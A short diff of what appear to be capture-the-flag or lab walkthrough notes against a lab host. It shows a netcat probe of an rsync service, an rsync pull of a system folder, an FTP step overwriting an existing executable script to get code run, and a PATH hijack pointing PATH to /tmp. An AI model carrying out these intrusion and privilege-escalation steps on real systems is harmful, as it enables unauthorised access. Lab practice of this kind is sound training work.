@@ -130,8 +130,8 @@ nc -vn 10.10.63.208 873
 #rsync -av rsync://rsync-connect@10.10.63.208/files/sys-internals /tmp/
 
 
-Run file in ftp
-ftp> get shell.sh-
+Run file in ftp (cannot give permission to a new file upload so just overwrite the existing file with executable access)
+ftp> get clean.sh -
 
 Exporting the path
 export PATH=/tmp:$path
